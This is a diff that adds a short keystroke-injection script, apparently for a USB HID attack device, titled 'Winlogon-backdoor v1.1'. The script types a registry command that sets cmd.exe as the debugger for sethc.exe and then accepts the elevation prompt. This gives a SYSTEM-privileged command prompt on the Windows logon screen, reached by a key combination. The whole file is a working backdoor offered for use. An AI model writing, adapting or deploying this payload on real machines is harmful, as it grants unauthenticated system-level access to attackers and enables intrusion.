@@ -1,0 +1,11 @@
+REM Winlogon-backdoor v1.1
+REM Makes a command prompt available on the logon screen that will close automatically after 3mins or so and has system privileges.
+REM Press Left Alt + Left Shift + Print Screen on the logon screen to access the prompt.
+DELAY 5000
+CTRL ESC
+DELAY 750
+STRING cmd.exe /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f"
+DELAY 750
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
